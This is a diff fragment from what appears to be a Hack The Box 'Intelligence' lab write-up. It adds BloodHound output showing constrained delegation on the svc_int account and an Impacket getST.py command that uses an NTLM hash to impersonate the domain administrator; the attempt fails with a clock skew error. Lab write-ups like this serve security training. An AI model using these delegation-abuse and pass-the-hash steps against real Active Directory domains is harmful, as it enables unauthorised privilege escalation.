@@ -631,3 +631,32 @@ INFO: Querying computer: dc.intelligence.htb
 WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.202622175216675 seconds
 INFO: Done in 00M 27S
 ```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# python3 -m json.tool 20211027010910_computers.json | grep -iA 10 svc                                          1 ⨯
+                "name": "SVC_INT.INTELLIGENCE.HTB",
+                "objectid": "S-1-5-21-4210132550-3389855604-3437519686-1144",
+                "domain": "INTELLIGENCE.HTB",
+                "highvalue": false,
+                "distinguishedname": "CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb",
+                "unconstraineddelegation": false,
+                "enabled": true,
+                "haslaps": false,
+                "lastlogontimestamp": -1,
+                "pwdlastset": 1635336145,
+                "serviceprincipalnames": [],
+                "description": null,
+                "operatingsystem": null,
+                "allowedtodelegate": [
+                    "WWW/dc.intelligence.htb"
+```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# python3 /usr/share/doc/python3-impacket/examples/getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$ 
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for user
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
